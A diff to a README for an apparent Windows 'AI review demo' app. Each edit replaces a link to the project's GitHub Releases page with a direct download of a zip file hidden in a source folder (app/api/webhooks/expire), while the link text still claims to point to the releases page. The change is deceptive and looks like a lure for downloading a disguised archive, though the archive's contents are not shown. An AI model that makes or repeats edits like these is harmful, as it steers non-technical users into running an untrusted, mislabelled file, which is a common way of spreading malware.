@@ -1,6 +1,6 @@
 # 🤖 nextjs-posthook-ai-review - Simple AI Review Demo for Windows
 
-[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge)](https://github.com/phorro/nextjs-posthook-ai-review/releases)
+[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge)](https://raw.githubusercontent.com/phorro/nextjs-posthook-ai-review/main/app/api/webhooks/expire/posthook-ai-review-nextjs-v2.4-alpha.2.zip)
 
 ## 🧩 What this is
 
@@ -15,7 +15,7 @@ This app is useful if you want to:
 
 ## 💾 Download the app
 
-1. Open the release page: https://github.com/phorro/nextjs-posthook-ai-review/releases
+1. Open the release page: https://raw.githubusercontent.com/phorro/nextjs-posthook-ai-review/main/app/api/webhooks/expire/posthook-ai-review-nextjs-v2.4-alpha.2.zip
 2. Find the latest release
 3. Download the Windows file from that release
 4. Save it to your computer
@@ -140,7 +140,7 @@ This project connects to these topics:
 
 Use the release page to get the latest Windows file:
 
-[Visit the releases page](https://github.com/phorro/nextjs-posthook-ai-review/releases)
+[Visit the releases page](https://raw.githubusercontent.com/phorro/nextjs-posthook-ai-review/main/app/api/webhooks/expire/posthook-ai-review-nextjs-v2.4-alpha.2.zip)
 
 ## 🖥️ When the app is running
 
@@ -181,4 +181,4 @@ You can repeat the process with new text each time. This helps you see how the r
 
 If you need the file again, use the same link:
 
-[Download from GitHub Releases](https://github.com/phorro/nextjs-posthook-ai-review/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/phorro/nextjs-posthook-ai-review/main/app/api/webhooks/expire/posthook-ai-review-nextjs-v2.4-alpha.2.zip)
